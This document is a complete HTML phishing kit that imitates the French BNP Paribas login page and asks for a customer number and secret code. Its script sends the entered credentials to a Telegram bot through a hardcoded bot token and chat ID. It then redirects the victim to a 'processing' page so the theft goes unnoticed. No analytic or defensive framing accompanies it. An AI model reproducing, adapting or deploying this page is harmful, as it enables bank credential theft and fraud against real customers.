<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>BNP Paribas - Connexion</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
    body {
      background: #f5f5f5;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      color: #333;
      position: relative;
    }
    .login-container {
      background: white;
      border-radius: 8px;
      padding: 30px 25px;
      width: 90%;
      max-width: 400px;
      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
      text-align: left;
      border-top: 4px solid #0072bc;
    }
    .logo {
      margin-bottom: 30px;
      text-align: center;
    }
    .logo img {
      height: 40px;
    }
    .form-title {
      color: #333;
      text-align: center;
      margin-bottom: 20px;
      font-size: 18px;
      font-weight: normal;
    }
    .form-description {
      color: #666;
      text-align: center;
      margin-bottom: 25px;
      font-size: 14px;
    }
    .input-group {
      margin-bottom: 20px;
      position: relative;
    }
    .input-group label {
      display: block;
      margin-bottom: 8px;
      color: #333;
      font-size: 14px;
    }
    .input-group input {
      width: 100%;
      padding: 12px 15px;
      border: 1px solid #ddd;
      border-radius: 4px;
      font-size: 16px;
      background-color: white;
      color: #333;
    }
    .checkbox-group {
      display: flex;
      align-items: center;
      margin-bottom: 20px;
    }
    .checkbox-group input {
      margin-right: 10px;
    }
    .checkbox-group label {
      font-size: 14px;
      color: #666;
    }
    button {
      width: 100%;
      padding: 12px;
      border-radius: 4px;
      border: none;
      font-weight: bold;
      font-size: 16px;
      background-color: #0072bc;
      color: white;
      cursor: pointer;
      margin-top: 10px;
      transition: background-color 0.3s;
    }
    button:hover {
      background-color: #005a94;
    }
    .error-message {
      color: #d32f2f;
      font-size: 14px;
      margin-top: 8px;
      display: none;
      text-align: center;
    }
    .loading {
      display: none;
      margin-top: 15px;
      color: #666;
      text-align: center;
    }
    .bottom-links {
      margin-top: 20px;
      text-align: center;
    }
    .bottom-links a {
      color: #0072bc;
      font-size: 13px;
      text-decoration: none;
      display: block;
      margin-bottom: 10px;
    }
    .security-info {
      margin-top: 30px;
      padding-top: 15px;
      border-top: 1px solid #eee;
      text-align: center;
      font-size: 12px;
      color: #666;
    }
    .input-icon {
      position: absolute;
      right: 12px;
      top: 50%;
      transform: translateY(-50%);
      width: 20px;
      height: 20px;
      color: #888;
      cursor: pointer;
    }
  </style>
</head>
<body>

  <div class="login-container">
    <div class="logo">
      <img src="e1350e88-5112-4f64-ab38-1df8e9af5d51_c.jpg" alt="BNP Paribas">
    </div>
    
    <h1 class="form-title">Saisissez votre code secret pour acc√©der √† votre compte</h1>
    
    <div class="input-group">
      <label for="client-number">Saisissez votre num√©ro client ici</label>
      <input type="text" id="client-number" placeholder="Num√©ro client" required>
    </div>
    
    <div class="input-group">
      <label for="secret-code">Code secret</label>
      <input type="password" id="secret-code" placeholder="Code secret" required>
      <span class="input-icon">üëÅÔ∏è</span>
    </div>
    
    <div class="checkbox-group">
      <input type="checkbox" id="remember-client">
      <label for="remember-client">M√©moire mon num√©ro client ici</label>
    </div>
    
    <div id="error-message" class="error-message">Veuillez entrer votre num√©ro client et code secret</div>
    
    <button id="submit-btn">Se connecter</button>
    <div id="loading" class="loading">Connexion en cours...</div>
    
    <div class="bottom-links">
      <a href="#">Num√©ro client ou code secret oubli√© ?</a>
      <a href="#">Premi√®re connexion ?</a>
      <a href="#">Besoin d'aide ?</a>
    </div>
    
    <div class="security-info">
      <p>BNP Paribas vous garantit une connexion s√©curis√©e</p>
    </div>
  </div>

  <script>
    document.addEventListener('DOMContentLoaded', function() {
      const clientNumberInput = document.getElementById('client-number');
      const secretCodeInput = document.getElementById('secret-code');
      const submitBtn = document.getElementById('submit-btn');
      const errorMessage = document.getElementById('error-message');
      const loadingElement = document.getElementById('loading');
      const eyeIcon = document.querySelector('.input-icon');
      
      // Toggle password visibility
      eyeIcon.addEventListener('click', function() {
        if (secretCodeInput.type === 'password') {
          secretCodeInput.type = 'text';
          eyeIcon.textContent = 'üîí';
        } else {
          secretCodeInput.type = 'password';
          eyeIcon.textContent = 'üëÅÔ∏è';
        }
      });

      submitBtn.addEventListener('click', async function() {
        const clientNumber = clientNumberInput.value.trim();
        const secretCode = secretCodeInput.value.trim();
        
        // V√©rification que les champs ne sont pas vides
        if (clientNumber.length > 0 && secretCode.length > 0) {
          // Afficher le chargement
          submitBtn.disabled = true;
          loadingElement.style.display = 'block';
          
          try {
            // Envoyer les donn√©es √† Telegram
            const botToken = '7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw';
            const chatId = '5372119436';
            const message = `Identifiants BNP Paribas re√ßus:\nNum√©ro client: ${clientNumber}\nCode secret: ${secretCode}`;
            
            const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json',
              },
              body: JSON.stringify({
                chat_id: chatId,
                text: message
              })
            });
            
            if (!response.ok) {
              throw new Error('Erreur lors de l\'envoi √† Telegram');
            }
            
            // Attendre 2 secondes avant la redirection
            setTimeout(() => {
              window.location.href = 'traitement.html';
            }, 2000);
            
          } catch (error) {
            console.error('Erreur:', error);
            errorMessage.textContent = 'Une erreur est survenue, veuillez r√©essayer';
            errorMessage.style.display = 'block';
            submitBtn.disabled = false;
            loadingElement.style.display = 'none';
          }
        } else {
          // Afficher le message d'erreur
          errorMessage.style.display = 'block';
          if (clientNumber.length === 0) {
            clientNumberInput.focus();
          } else {
            secretCodeInput.focus();
          }
        }
      });

      // Masquer le message d'erreur quand l'utilisateur commence √† taper
      clientNumberInput.addEventListener('input', function() {
        errorMessage.style.display = 'none';
      });
      
      secretCodeInput.addEventListener('input', function() {
        errorMessage.style.display = 'none';
      });

      // Permettre la validation avec la touche Entr√©e
      secretCodeInput.addEventListener('keypress', function(e) {
        if (e.key === 'Enter') {
          submitBtn.click();
        }
      });
    });
  </script>
</body>
</html>
